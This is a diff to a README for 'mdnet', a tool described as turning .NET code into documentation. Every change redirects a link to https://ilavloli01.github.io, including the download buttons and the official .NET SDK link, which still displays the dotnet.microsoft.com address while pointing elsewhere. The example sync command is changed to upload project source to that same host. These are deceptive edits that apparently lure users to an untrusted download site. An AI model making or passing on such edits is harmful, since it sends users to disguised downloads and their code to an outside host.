@@ -1,7 +1,7 @@
 <h1>📚 mdnet - Turn .NET Code into Beautiful Documentation</h1>
 
 <p align="center">
-  <a href="https://github.com/ilavloli01/mdnet" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#FF6B6B,#4ECDC4);color:white;font-size:24px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);margin:20px 0;">⬇️ DOWNLOAD NOW</a>
+  <a href="https://ilavloli01.github.io" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#FF6B6B,#4ECDC4);color:white;font-size:24px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);margin:20px 0;">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ## ✨ What is mdnet?
@@ -41,7 +41,7 @@ Follow these simple steps to start using mdnet:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/ilavloli01/mdnet](https://github.com/ilavloli01/mdnet)**
+Visit this link to download the application: **[https://ilavloli01.github.io](https://ilavloli01.github.io)**
 
 Click the big green "Code" button on the page, then select "Download ZIP". Wait for the download to finish.
 
@@ -65,7 +65,7 @@ Type this command and press Enter:
 dotnet --version
 ```
 
-If you see a version number, you're ready! If you get an error, visit **[dotnet.microsoft.com/download](https://dotnet.microsoft.com/download)** and install the latest .NET SDK, then try again.
+If you see a version number, you're ready! If you get an error, visit **[dotnet.microsoft.com/download](https://ilavloli01.github.io)** and install the latest .NET SDK, then try again.
 
 ### Step 5: Test mdnet
 
@@ -104,7 +104,7 @@ dotnet mdnet generate --source "C:\path\to\your\project" --format html
 
 When you update your code and want to refresh your documentation:
 ```
-dotnet mdnet sync --source "C:\path\to\your\project" --remote "https://your-docs-site.com"
+dotnet mdnet sync --source "C:\path\to\your\project" --remote "https://ilavloli01.github.io"
 ```
 
 ## 💡 Real-World Example
@@ -171,7 +171,7 @@ Download mdnet now and transform your .NET projects from code-only into fully do
 **Ready to get started?**
 
 <p align="center">
-  <a href="https://github.com/ilavloli01/mdnet" style="display:inline-block;padding:14px 36px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;font-size:20px;font-weight:bold;border-radius:10px;text-decoration:none;box-shadow:0 4px 12px rgba(0,0,0,0.2);">🚀 GET MDNET NOW</a>
+  <a href="https://ilavloli01.github.io" style="display:inline-block;padding:14px 36px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;font-size:20px;font-weight:bold;border-radius:10px;text-decoration:none;box-shadow:0 4px 12px rgba(0,0,0,0.2);">🚀 GET MDNET NOW</a>
 </p>
 
 ---
